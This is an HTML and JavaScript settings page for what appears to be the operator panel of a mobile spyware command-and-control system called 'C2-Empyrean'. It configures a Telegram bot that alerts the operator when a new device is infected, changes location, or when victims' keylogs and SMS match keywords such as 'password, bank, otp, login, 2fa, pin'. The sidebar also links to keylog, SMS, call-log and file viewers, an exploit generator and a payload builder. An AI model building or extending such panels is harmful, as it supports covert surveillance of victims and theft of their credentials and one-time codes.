<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram Settings - C2-Empyrean</title>
    <link rel="stylesheet" href="/assets/css/dashboard.css">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0a0a0f;
            color: #e0e0e0;
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
            min-height: 100vh;
        }
        .app-container { display: flex; min-height: 100vh; }
        .sidebar {
            width: 260px;
            background: rgba(255, 255, 255, 0.02);
            border-right: 1px solid rgba(255, 255, 255, 0.05);
            padding: 24px 16px;
            position: fixed;
            top: 0; left: 0;
            height: 100vh;
            overflow-y: auto;
            z-index: 100;
        }
        .sidebar-logo {
            font-size: 22px; font-weight: 800;
            background: linear-gradient(135deg, #00d4ff, #7b2ff7);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 32px; padding: 0 12px;
        }
        .sidebar-nav { list-style: none; }
        .sidebar-nav li { margin-bottom: 4px; }
        .sidebar-nav a {
            display: flex; align-items: center; gap: 12px;
            padding: 10px 12px; color: rgba(255, 255, 255, 0.5);
            text-decoration: none; border-radius: 10px;
            font-size: 14px; font-weight: 500; transition: all 0.2s ease;
        }
        .sidebar-nav a:hover { background: rgba(255, 255, 255, 0.05); color: rgba(255, 255, 255, 0.8); }
        .sidebar-nav a.active { background: rgba(123, 47, 247, 0.15); color: #7b2ff7; }
        .sidebar-nav .icon { width: 20px; text-align: center; font-size: 16px; }
        .sidebar-divider { border: none; border-top: 1px solid rgba(255, 255, 255, 0.05); margin: 16px 12px; }
        .sidebar-section-title { color: rgba(255, 255, 255, 0.2); font-size: 11px; font-weight: 600; text-transform: uppercase; letter-spacing: 1.5px; padding: 8px 12px; }

        .main-content {
            margin-left: 260px; flex: 1;
            padding: 28px 32px;
            max-width: calc(100vw - 260px);
        }
        .page-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 28px; }
        .page-title { font-size: 28px; font-weight: 700; color: #fff; }
        .page-title span { font-size: 14px; font-weight: 400; color: rgba(255, 255, 255, 0.3); }
        .header-actions { display: flex; gap: 12px; }
        .header-btn {
            padding: 8px 16px; background: rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(255, 255, 255, 0.08); border-radius: 8px;
            color: rgba(255, 255, 255, 0.7); font-size: 13px;
            cursor: pointer; transition: all 0.2s;
        }
        .header-btn:hover { background: rgba(255, 255, 255, 0.1); color: #fff; }

        .settings-section {
            background: rgba(255, 255, 255, 0.03);
            border: 1px solid rgba(255, 255, 255, 0.06);
            border-radius: 16px;
            padding: 24px;
            margin-bottom: 20px;
            max-width: 600px;
        }
        .section-title {
            font-size: 16px; font-weight: 600; color: #fff;
            margin-bottom: 20px; padding-bottom: 12px;
            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
        }
        .form-group { margin-bottom: 16px; }
        .form-group label {
            display: block; font-size: 13px; color: rgba(255, 255, 255, 0.5);
            margin-bottom: 6px; font-weight: 500;
        }
        .form-group input, .form-group select {
            width: 100%; padding: 10px 14px;
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(255, 255, 255, 0.08);
            border-radius: 8px; color: #fff; font-size: 13px; outline: none;
        }
        .form-group input:focus, .form-group select:focus { border-color: #7b2ff7; }
        .form-group .help-text { font-size: 11px; color: rgba(255, 255, 255, 0.2); margin-top: 4px; }
        .btn-save {
            padding: 10px 28px;
            background: linear-gradient(135deg, #7b2ff7, #00d4ff);
            border: none; border-radius: 8px; color: #fff;
            font-weight: 600; font-size: 14px; cursor: pointer;
        }
        .btn-save:hover { opacity: 0.9; }
        .btn-test {
            padding: 10px 20px;
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(255, 255, 255, 0.08);
            border-radius: 8px; color: rgba(255, 255, 255, 0.7);
            font-size: 13px; cursor: pointer; margin-left: 8px;
        }
        .btn-test:hover { background: rgba(255, 255, 255, 0.1); }

        .toggle-switch {
            position: relative; display: inline-block; width: 48px; height: 26px;
        }
        .toggle-switch input { opacity: 0; width: 0; height: 0; }
        .toggle-slider {
            position: absolute; cursor: pointer; top: 0; left: 0; right: 0; bottom: 0;
            background: rgba(255,255,255,0.1); border-radius: 26px; transition: 0.3s;
        }
        .toggle-slider:before {
            content: ""; position: absolute; height: 20px; width: 20px;
            left: 3px; bottom: 3px; background: #fff; border-radius: 50%; transition: 0.3s;
        }
        .toggle-switch input:checked + .toggle-slider { background: #34c759; }
        .toggle-switch input:checked + .toggle-slider:before { transform: translateX(22px); }

        .toast {
            position: fixed; bottom: 24px; right: 24px;
            padding: 14px 20px; border-radius: 10px;
            font-size: 14px; font-weight: 500;
            transform: translateY(100px); opacity: 0;
            transition: all 0.3s ease; z-index: 9999;
        }
        .toast.show { transform: translateY(0); opacity: 1; }
        .toast.success { background: rgba(52, 199, 89, 0.2); border: 1px solid rgba(52, 199, 89, 0.3); color: #34c759; }
        .toast.error { background: rgba(255, 69, 58, 0.2); border: 1px solid rgba(255, 69, 58, 0.3); color: #ff453a; }

        @media (max-width: 768px) {
            .sidebar { display: none; }
            .main-content { margin-left: 0; max-width: 100%; padding: 20px; }
        }
    </style>
</head>
<body>
    <div class="app-container">
        <nav class="sidebar">
            <div class="sidebar-logo">C2-Empyrean</div>
            <div class="sidebar-section-title">Main</div>
            <ul class="sidebar-nav">
                <li><a href="/admin/dashboard"><span class="icon">📊</span> Dashboard</a></li>
                <li><a href="/admin/devices"><span class="icon">📱</span> Devices</a></li>
                <li><a href="/admin/map_view"><span class="icon">🗺️</span> Map View</a></li>
                <li><a href="/admin/command_console"><span class="icon">⚡</span> Command Console</a></li>
                <li><a href="/admin/analytics"><span class="icon">📈</span> Analytics</a></li>
            </ul>
            <hr class="sidebar-divider">
            <div class="sidebar-section-title">Data</div>
            <ul class="sidebar-nav">
                <li><a href="/admin/keylog_viewer"><span class="icon">⌨️</span> Keylogs</a></li>
                <li><a href="/admin/sms_console"><span class="icon">💬</span> SMS</a></li>
                <li><a href="/admin/call_logs"><span class="icon">📞</span> Call Logs</a></li>
                <li><a href="/admin/notification_viewer"><span class="icon">🔔</span> Notifications</a></li>
                <li><a href="/admin/file_browser"><span class="icon">📁</span> Files</a></li>
            </ul>
            <hr class="sidebar-divider">
            <div class="sidebar-section-title">Actions</div>
            <ul class="sidebar-nav">
                <li><a href="/admin/exploit_generator"><span class="icon">🎣</span> Exploit Generator</a></li>
                <li><a href="/admin/campaign_manager"><span class="icon">📢</span> Campaigns</a></li>
                <li><a href="/admin/builder"><span class="icon">🔧</span> Builder</a></li>
            </ul>
            <hr class="sidebar-divider">
            <div class="sidebar-section-title">System</div>
            <ul class="sidebar-nav">
                <li><a href="/admin/settings"><span class="icon">⚙️</span> Settings</a></li>
                <li><a href="/admin/telegram_settings" class="active"><span class="icon">🤖</span> Telegram</a></li>
            </ul>
        </nav>

        <main class="main-content">
            <div class="page-header">
                <h1 class="page-title">🤖 Telegram Bot <span>bot control & alerts</span></h1>
            </div>

            <div class="settings-section">
                <div class="section-title">Bot Configuration</div>
                <div class="form-group">
                    <label>Bot Token</label>
                    <input type="password" id="botToken" placeholder="1234567890:ABCdefGHIjklMNOpqrsTUVwxyz">
                    <div class="help-text">From @BotFather on Telegram. Bot must have message reading enabled.</div>
                </div>
                <div class="form-group">
                    <label>Authorized Chat ID</label>
                    <input type="text" id="chatId" placeholder="-1001234567890">
                    <div class="help-text">Chat/group ID where bot will send alerts. Get from @userinfobot.</div>
                </div>
                <div class="form-group" style="display:flex;align-items:center;gap:16px;">
                    <label style="margin-bottom:0;">Bot Active</label>
                    <label class="toggle-switch">
                        <input type="checkbox" id="botActive">
                        <span class="toggle-slider"></span>
                    </label>
                    <span id="botStatusText" style="font-size:13px;color:rgba(255,255,255,0.3);">Inactive</span>
                </div>
                <div>
                    <button class="btn-save" onclick="saveBotSettings()">Save Bot Settings</button>
                    <button class="btn-test" onclick="testBot()">📨 Test Message</button>
                </div>
            </div>

            <div class="settings-section">
                <div class="section-title">📢 Notification Events</div>
                <div class="form-group" style="display:flex;align-items:center;gap:12px;padding:8px 0;">
                    <label class="toggle-switch"><input type="checkbox" id="notifNewDevice" checked><span class="toggle-slider"></span></label>
                    <span style="font-size:13px;">New device registered</span>
                </div>
                <div class="form-group" style="display:flex;align-items:center;gap:12px;padding:8px 0;">
                    <label class="toggle-switch"><input type="checkbox" id="notifDeviceOffline" checked><span class="toggle-slider"></span></label>
                    <span style="font-size:13px;">Device goes offline</span>
                </div>
                <div class="form-group" style="display:flex;align-items:center;gap:12px;padding:8px 0;">
                    <label class="toggle-switch"><input type="checkbox" id="notifKeylogAlert"><span class="toggle-slider"></span></label>
                    <span style="font-size:13px;">Keylog keyword match</span>
                </div>
                <div class="form-group" style="display:flex;align-items:center;gap:12px;padding:8px 0;">
                    <label class="toggle-switch"><input type="checkbox" id="notifSmsAlert"><span class="toggle-slider"></span></label>
                    <span style="font-size:13px;">SMS containing keywords</span>
                </div>
                <div class="form-group" style="display:flex;align-items:center;gap:12px;padding:8px 0;">
                    <label class="toggle-switch"><input type="checkbox" id="notifLocation"><span class="toggle-slider"></span></label>
                    <span style="font-size:13px;">Location update</span>
                </div>
                <button class="btn-save" onclick="saveNotifSettings()" style="margin-top:12px;">Save Notification Settings</button>
            </div>

            <div class="settings-section">
                <div class="section-title">⌨️ Keyword Alerts</div>
                <div class="form-group">
                    <label>Keyword List (comma separated)</label>
                    <input type="text" id="keywords" placeholder="password, bank, otp, login, 2fa, pin, credit">
                    <div class="help-text">Case-insensitive. Matches in keylogs, SMS, and notifications.</div>
                </div>
                <button class="btn-save" onclick="saveKeywords()">Save Keywords</button>
            </div>
        </main>
    </div>

    <div class="toast" id="toast"></div>

    <script>
        document.addEventListener('DOMContentLoaded', loadTelegramSettings);

        async function loadTelegramSettings() {
            try {
                const r = await fetch('/api/telegram/settings', {
                    headers: { 'Authorization': 'Bearer ' + getCookie('access_token') }
                });
                const result = await r.json();
                if (!result.success) return;
                const s = result.data;
                document.getElementById('botToken').value = s.bot_token || '';
                document.getElementById('chatId').value = s.chat_id || '';
                document.getElementById('botActive').checked = s.active || false;
                document.getElementById('botStatusText').textContent = s.active ? '✅ Active' : '❌ Inactive';
                if (s.notifications) {
                    document.getElementById('notifNewDevice').checked = s.notifications.new_device !== false;
                    document.getElementById('notifDeviceOffline').checked = s.notifications.device_offline !== false;
                    document.getElementById('notifKeylogAlert').checked = s.notifications.keylog_alert || false;
                    document.getElementById('notifSmsAlert').checked = s.notifications.sms_alert || false;
                    document.getElementById('notifLocation').checked = s.notifications.location || false;
                }
                document.getElementById('keywords').value = (s.keywords || []).join(', ');
            } catch (err) {}
        }

        async function saveBotSettings() {
            const data = {
                bot_token: document.getElementById('botToken').value,
                chat_id: document.getElementById('chatId').value,
                active: document.getElementById('botActive').checked
            };
            const r = await fetch('/api/telegram/settings', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + getCookie('access_token') },
                body: JSON.stringify(data)
            });
            const result = await r.json();
            showToast(result.success ? '✅ Saved' : '❌ ' + (result.error || 'Error'), result.success);
            if (result.success) document.getElementById('botStatusText').textContent = data.active ? '✅ Active' : '❌ Inactive';
        }

        async function testBot() {
            showToast('⏳ Sending test message...', true);
            const r = await fetch('/api/telegram/test', {
                method: 'POST',
                headers: { 'Authorization': 'Bearer ' + getCookie('access_token') }
            });
            const result = await r.json();
            showToast(result.success ? '✅ Test message sent!' : '❌ ' + (result.error || 'Error'), result.success);
        }

        async function saveNotifSettings() {
            const data = {
                notifications: {
                    new_device: document.getElementById('notifNewDevice').checked,
                    device_offline: document.getElementById('notifDeviceOffline').checked,
                    keylog_alert: document.getElementById('notifKeylogAlert').checked,
                    sms_alert: document.getElementById('notifSmsAlert').checked,
                    location: document.getElementById('notifLocation').checked
                }
            };
            const r = await fetch('/api/telegram/settings', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + getCookie('access_token') },
                body: JSON.stringify(data)
            });
            const result = await r.json();
            showToast(result.success ? '✅ Saved' : '❌ Error', result.success);
        }

        async function saveKeywords() {
            const kw = document.getElementById('keywords').value.split(',').map(k => k.trim()).filter(Boolean);
            const r = await fetch('/api/telegram/settings', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + getCookie('access_token') },
                body: JSON.stringify({ keywords: kw })
            });
            const result = await r.json();
            showToast(result.success ? '✅ Saved' : '❌ Error', result.success);
        }

        function showToast(msg, success) {
            const t = document.getElementById('toast');
            t.textContent = msg;
            t.className = 'toast ' + (success ? 'success' : 'error') + ' show';
            setTimeout(() => t.classList.remove('show'), 3000);
        }

        function getCookie(name) {
            const match = document.cookie.match(new RegExp('(^| )' + name + '=([^;]+)'));
            return match ? decodeURIComponent(match[2]) : null;
        }
    </script>
</body>
</html>
